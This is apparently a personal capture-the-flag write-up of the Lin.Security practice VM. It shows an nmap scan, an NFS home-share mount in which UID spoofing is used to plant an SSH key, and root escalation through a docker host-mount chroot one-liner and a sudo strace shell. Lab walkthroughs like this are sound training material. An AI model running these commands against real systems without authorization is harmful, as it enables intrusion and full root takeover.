---
layout: default
title : muzec - Lin.Security Writeup
---

Here at in.security we wanted to develop a Linux virtual machine that is based, at the time of writing, on an up-to-date Ubuntu distro (18.04 LTS), now we are in 2021 damn it old but suffers from a number of vulnerabilities that allow a user to escalate to root on the box. This has been designed to help understand how certain built-in applications and services if misconfigured, may be abused by an attacker.

We have configured the box to simulate real-world vulnerabilities (albeit on a single host) which will help you to perfect your local privilege escalation skills, techniques and toolsets. There are a number challenges which range from fairly easy to intermediate level and we’re excited to see the methods you use to solve them!

The image is just under 1.7 GB and can be downloaded using the link above. On opening the OVA file a VM named lin.security will be imported and configured with a NAT adapter, but this can be changed to bridged via the the preferences of your preferred virtualisation platform.

To get started you can log onto the host with the credentials: `bob/secret` [NOTE:- am not going to use the credentials] .

![image](https://user-images.githubusercontent.com/69868171/125940993-5f643978-948d-4fe3-891e-b3c461773e57.png)


We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```


```
# Nmap 7.91 scan initiated Mon Jun 14 16:33:32 2021 as: nmap -sC -p- -sV -oA nmap 172.16.139.211
Nmap scan report for 172.16.139.211
Host is up (0.00022s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7a:9b:b9:32:6f:95:77:10:c0:a0:80:35:34:b1:c0:00 (RSA)
|   256 24:0c:7a:82:78:18:2d:66:46:3b:1a:36:22:06:e1:a1 (ECDSA)
|_  256 b9:15:59:78:85:78:9e:a5:e6:16:f6:cf:96:2d:1d:36 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35839/tcp6  mountd
|   100005  1,2,3      43267/tcp   mountd
|   100005  1,2,3      50857/udp   mountd
|   100005  1,2,3      50992/udp6  mountd
|   100021  1,3,4      37895/tcp6  nlockmgr
|   100021  1,3,4      40437/tcp   nlockmgr
|   100021  1,3,4      41175/udp   nlockmgr
|   100021  1,3,4      44913/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
40437/tcp open  nlockmgr 1-4 (RPC #100021)
43267/tcp open  mountd   1-3 (RPC #100005)
51101/tcp open  mountd   1-3 (RPC #100005)
54251/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 14 16:33:41 2021 -- 1 IP address (1 host up) scanned in 8.37 seconds
```

We have some really interesting ports here also we are provide with credentials to log in with SSH but damn that is lame man if you decided to use it without actually finding another way in without the credentials. Now let kick of our enumeration on the target.

### POSSIBLE WAY IN NFS 2049

Checking for NFS share with below command;

```
showmount -e 172.16.139.211
```
Now we have confirm we have a share to mount now let go ahead.


![image](https://user-images.githubusercontent.com/69868171/125942070-48825124-c849-496d-a8fd-f83a7e8fa00e.png)


```
mkdir /tmp/peter
mount -v -t  nfs  -o vers=3,proto=tcp,nolock 172.16.139.211:/home/peter /tmp/peter
df -k
```

![image](https://user-images.githubusercontent.com/69868171/125942192-fdc8ccbb-5737-4b1f-bebb-8a1547c872cf.png)


Now let access the mounted folder to see what we have.

```
┌──(root💀Muzec-Security)-[/home/muzec/Documents/Vulnhubs/lin]
└─# cd /tmp/peter
                                                                                                                                                                       
┌──(root💀Muzec-Security)-[/tmp/peter]
└─# ls -la
total 48
drwxr-xr-x  6 1001 1005  4096 Jun 15 00:42 .
drwxrwxrwt 20 root root 12288 Jul 16 09:40 ..
-rw-------  1 root root    65 Jun 15 00:42 .bash_history
-rw-r--r--  1 1001 1005   220 Jul  9  2018 .bash_logout
-rw-r--r--  1 1001 1005  3771 Jul  9  2018 .bashrc
drwx------  2 1001 1005  4096 Jul 10  2018 .cache
-rw-rw-r--  1 1001 1005     0 Jul 10  2018 .cloud-locale-test.skip
drwx------  3 1001 1005  4096 Jul 10  2018 .gnupg
drwxrwxr-x  3 1001 1005  4096 Jul 10  2018 .local
-rw-r--r--  1 1001 1005   807 Jul  9  2018 .profile
drwxr-xr-x  2 1001 1001  4096 Jun 15 00:38 .ssh
```

We now see we have access to `peter` home directory also the `.SSH` .

![image](https://user-images.githubusercontent.com/69868171/125945606-5547531c-d2ae-4ea9-95b4-5c431b4d37c7.png)

But i can't seems to write to the `authorized_keys` using the root user now let try something cool.

![image](https://user-images.githubusercontent.com/69868171/125945854-da461c1c-0911-4016-bc0c-b04efb35676d.png)

Back to the `peter` folder i note down the user UID number now let try creating a user with the same UID number.

![image](https://user-images.githubusercontent.com/69868171/125946118-6b3431b5-ce37-4bad-ac0d-7901a6566265.png)

Seems i don't need to add the UID lol since i only have one user which is `muzec` with UID 1000 so `peter` will be UID 1001. Now we are in let to add the `authorized_keys` again.

![image](https://user-images.githubusercontent.com/69868171/125946393-0bb5af01-bc3f-4d91-a746-73aab782551e.png)

It works now that what am talking about let use our `SSH private key` to SSH into the target.

![image](https://user-images.githubusercontent.com/69868171/125946713-80a7c578-21e5-49ac-a743-c71d48318b56.png)

We are in and seems we can run docker to obtain root shell.

### Privilege Escalation

`sudo -l` and we can run `/usr/bin/strace` to obtain root also after docker let try using the 2 method.

### DOCKER

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![image](https://user-images.githubusercontent.com/69868171/125948258-71f4bb77-43f7-49b1-9680-4055e65611a6.png)

We are root.

### STRACE

```
sudo strace -o /dev/null /bin/sh
```

![image](https://user-images.githubusercontent.com/69868171/125948673-6f31ccf3-5132-47b4-b4bf-f1d8a0a7b0dd.png)

We are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
